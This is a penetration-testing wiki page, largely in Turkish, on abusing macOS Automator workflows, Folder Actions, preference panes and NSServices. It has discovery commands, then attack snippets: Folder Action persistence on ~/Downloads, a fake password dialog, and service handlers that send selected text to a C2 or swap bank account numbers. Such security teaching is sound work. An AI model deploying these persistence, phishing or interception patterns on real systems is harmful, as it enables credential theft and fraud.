# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Temel Bilgiler

**Automator**, macOS'in görsel otomasyon aracıdır. **workflows** (`.workflow` bundles) dosyalarından oluşan **actions** (`.action` bundles) çalıştırır. Automator ayrıca **Folder Actions**, **Quick Actions** ve **Shortcuts** entegrasyonunu da destekler. Modern macOS'te workflows ayrıca **Shortcuts** içine de **imported** edilebilir; bu yüzden aynı kötü amaçlı mantık bir Finder Quick Action, `~/Library/Services/` altında bir kullanıcı servisi veya eski Automator actions tarafından desteklenen bir shortcut olarak görünebilir.

Automator actions, bir workflow çalıştığında Automator runtime içine yüklenen **plugins**'lerdir. Şunları yapabilirler:
- Rastgele shell scripts çalıştırabilir
- Dosya ve verileri işleyebilir
- AppleScript üzerinden uygulamalarla etkileşime girebilir
- Karmaşık otomasyon için birbirine zincirlenebilir

### Bunun Neden Önemi Var

> [!WARNING]
> Automator workflows, **social-engineered** edilerek çalıştırılabilir — basit belge dosyaları gibi görünürler. Bir `.workflow` bundle, workflow çalıştığında yürütülen gömülü shell commands içerebilir. Folder Actions ile birleştiğinde, dosya olaylarında tetiklenen **automatic persistence** sağlarlar. Son Gatekeeper düzeltmeleri ayrıca, **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) içeriklerinin zararsız veri değil, executable content olarak ele alınması gerektiğini gösterdi.

### Keşif
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Saldırı: Social-Engineered Workflow

Bir `.workflow` bundle çoğu kullanıcıya normal bir belge dosyası gibi görünür:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Saldırı: Folder Action Kalıcılığı

Folder Actions, izlenen bir klasöre dosya eklendiğinde otomatik olarak bir workflow çalıştırır:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions yeniden başlatmalar arasında kalıcıdır ve sessizce çalışır. `~/Downloads` üzerindeki bir Folder Action, **indirilen her dosyanın payload’unuzu tetiklemesi** anlamına gelir — Safari, Chrome, AirDrop ve e-posta ekleri dahil. Ayrıca `System Events`’in, varsayılan `~/Library/Scripts/Folder Action Scripts` konumlarının dışındaki script’lere işaret eden Folder Actions kaydedebileceğini unutmayın; bu da loose-path hunting için değerlidir. İlgili TCC etkileri için [the TCC page](../macos-security-protections/macos-tcc/README.md) bölümüne bakın.

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles), **System Settings** (eski adıyla System Preferences) tarafından yüklenen plugin’lerdir. Sistem veya üçüncü taraf özellikler için yapılandırma UI panelleri sağlarlar. Eski sistemlerde doğrudan `System Preferences` tarafından yüklenirlerdi; daha yeni sürümlerde üçüncü taraf paneller genellikle **legacy loader XPC service** üzerinden, System Settings tarafından başlatılarak broker edilir.

### Why This Matters

- Preference panes, System Settings / System Preferences tarafından başlatılan **trusted host process** içinde çalışır
- Modern sistemlerde bu host, bir **`legacyLoader` XPC service** olabilir; bu yüzden önemli sınır yine **trusted Apple UI process -> third-party code loading**’dir
- Third-party preference panes, o UI’ya bağlı **host process security context** ve kullanıcı güvenini devralır
- Kullanıcılar preference panes’i **double-clicking** ile yükler — sosyal mühendislik için kolaydır
- Yüklendikten sonra **kalıcı** olurlar ve System Settings ilgili paneli her açtığında yüklenirler

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Saldırı: Privilege Context Hijacking

Kötü amaçlı bir preference pane, **pane host'un** security context'ini devralır (tarihsel olarak `System Preferences`, yeni sürümlerde çoğunlukla `System Settings` tarafından başlatılan bir `legacyLoader` helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Saldırı: Kurulum Yoluyla Persistence
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Saldırı: UI Phishing

Bir preference pane, meşru sistem UI panellerini taklit ederek **kimlik bilgilerini phish etmek** için kullanılabilir:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** uygulamaların **Services menu** (sağ tık → Services) üzerinden diğer uygulamalara işlev sunmasına izin verir. Kullanıcı metin veya veri seçip bir service çalıştırdığında, seçilen veri işlem için **service provider**’a gönderilir.

Services, bir uygulamanın `Info.plist` dosyasında `NSServices` anahtarı altında tanımlanır ve pasteboard server (`pbs`) ile kaydedilir. macOS ayrıca hangi services’in görünür olacağını ve sandboxed çağıranların ekstra bir uyarı alıp almayacağını belirleyen bir **service cache** ve bir **restriction policy** tutar.

### Why This Matters

- Services, **cross-application data flow** alır — herhangi bir uygulamadan seçilen metin service’e gönderilir
- Kötü amaçlı bir service, password managers, email clients, financial apps içindeki verileri ele geçirebilir
- Services, çağıran uygulamaya **değiştirilmiş veri** döndürebilir (seçim işlemlerinde man-in-the-middle)
- Service isimleri meşru görünecek şekilde hazırlanabilir ("Format Text", "Encrypt Selection", "Share")
- Opsiyonel `NSRestricted` flag’i güvenlik açısından önemlidir: unrestricted olarak işaretlenmiş bir service, macOS’un escape-prone services için gösterdiği uyarı olmadan sandboxed bir app tarafından çağrılabilir

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Saldırı: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Saldırı: Veri Değiştirme (Man-in-the-Middle)

Bir servis, meşru bir işlev sağlıyor gibi görünürken **döndürülen veriyi değiştirebilir**:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Kısıtlı Servisler ve Modern Kötüye Kullanım

Apple, her servis tanımı için isteğe bağlı bir `NSRestricted` boolean'ını destekler. Eğer ayarlanırsa, macOS sandbox içindeki çağıranları uyarır çünkü servis onların sandbox veya privacy sınırlarından **kaçmasına** yardımcı olabilir. Saldırgan bakış açısından bu, iki kullanışlı denetim yolu sağlar:

- Apple Events, dosya erişimi veya diğer ayrıcalıklı eylemleri proxyleyen **kısıtlı olarak işaretlenmemiş üçüncü taraf servisleri** bul
- Güçlü entitlements'a sahip **yüksek değerli yerleşik servisleri** bul (örneğin, Script Editor veya Finder-backed yardımcıları tarafından açığa çıkarılan servisler) ve kullanıcı etkileşiminin bunları bir veri erişim ilkeline dönüştürmek için yeterli olup olmadığını kontrol et

Yakın zamandaki iyi bir örnek **CVE-2022-48574**'tür; burada Services mekanizması, beklenen confirmation flow olmadan **TCC korumalı kullanıcı dosyalarına ulaşmak** için kötüye kullanılabiliyordu. Hata düzeltildi, ancak teknik threat modeling için hâlâ faydalıdır: çağıran adına dosya erişimi veya automation isteklerini ileten her servis aynı incelemeyi hak eder.

---

## Recent Security Notes

- **Quick Actions executable content'tir**: Apple, 2024'te app-bundled Automator Quick Action'ın normal assessment olmadan çalışabildiği bir Gatekeeper bypass'ını düzeltti. Uygulamaları denetlerken, `Contents/PlugIns/*.workflow/Contents/document.wflow` dosyasını helper scripts veya login items'ı inceler gibi inceleyin. Bkz. [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts eski Automator davranışını devralabilir**: Apple, üçüncü taraf shortcuts'ların beklenen permission flow olmadan Apple Events göndermek için **legacy Automator action** kullandığının bulunmasının ardından ek bir user-consent prompt da ekledi. İçe aktarılan workflows ve shortcut bundles, `Run AppleScript`, `Run Shell Script` ve benzeri bridge actions için gözden geçirilmelidir. Bkz. [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator hâlâ canlı bir privacy boundary'dir**: Apple, 2025'te protected user data'ya erişim için başka bir Automator fix'i yayınladı. Automator bir legacy yüzey olsa bile, herhangi bir workflow runner, Quick Action host veya automation bridge'i ölü kod yerine güncel bir attack surface olarak ele alın.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Yükseltme
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Parola Yöneticisi Hırsızlığı
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referanslar

* [Apple — macOS Ventura 13.7, Sonoma 14.7 ve Sequoia 15'in güvenlik içeriği hakkında](https://support.apple.com/en-us/121238)
* [Moonlock — NSServices exploit'i macOS üzerinde nasıl çalıştı](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
